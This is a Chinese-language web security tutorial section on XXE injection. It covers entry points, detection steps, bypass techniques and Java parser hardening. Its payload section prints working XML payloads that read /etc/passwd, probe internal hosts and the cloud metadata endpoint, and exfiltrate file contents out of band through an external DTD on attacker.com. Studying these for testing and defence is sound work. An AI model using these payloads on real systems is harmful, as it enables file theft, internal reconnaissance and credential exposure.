# Web 安全 - XXE（XML 外部实体注入）

> 来源: WooYun 漏洞库 | 拆自 web-injection.md

## 四、XXE (XML外部实体注入)

### 4.1 漏洞本质

```
XML输入 -> 解析器启用DTD/外部实体 -> 实体引用被解析执行 -> 文件读取/SSRF/RCE
```

**核心公式**：XXE = XML解析器允许外部实体引用 + 用户可控XML输入

### 4.2 检测方法

**高危入口点识别**

| 入口类型 | 检测特征 | 典型场景 |
|----------|----------|----------|
| API接口 | Content-Type含`text/xml`或`application/xml` | RESTful API、SOAP Web服务 |
| 文件上传 | SVG图片、DOCX/XLSX/PPTX(本质ZIP含XML) | 头像上传、文档导入 |
| 数据解析 | XML配置导入、RSS/Atom订阅 | 后台管理、聚合功能 |
| 协议交互 | SAML认证、WebDAV、XMPP | SSO登录、文件管理 |

**快速检测流程**

```
1. 识别XML处理接口 → 修改Content-Type为application/xml测试
2. 发送基础DTD声明 → 观察是否解析(报错差异)
3. 尝试外部实体引用 → file协议读取已知文件
4. 无回显时 → OOB外带(DNS/HTTP回连)
```

### 4.3 经典Payload

#### 文件读取（有回显）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRF内网探测

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### 盲注 - OOB外带数据

```xml
<!-- 外部DTD (attacker服务器托管evil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtd内容: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### 报错回显

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 绕过技巧

| 绕过方式 | 方法 | 适用场景 |
|----------|------|----------|
| 编码绕过 | UTF-16BE/LE、UTF-7编码XML | WAF基于ASCII模式匹配 |
| 参数实体嵌套 | `%entity;`替代`&entity;` | 过滤通用实体`&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | 无法控制DOCTYPE声明 |
| SVG嵌入 | SVG文件内嵌XXE实体 | 仅允许图片上传 |
| DOCX/XLSX嵌入 | 修改Office文档内`[Content_Types].xml` | 文档上传功能 |
| CDATA包裹 | 用CDATA段绕过特殊字符限制 | 读取含XML特殊字符的文件 |

### 4.5 防御措施

```java
// Java: 禁用DTD和外部实体
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- 禁用DTD处理和外部实体解析（首选）
- 使用JSON替代XML进行数据交换
- 输入白名单校验、升级XML解析库
- WAF规则拦截`<!DOCTYPE`/`<!ENTITY`/`SYSTEM`关键字

---

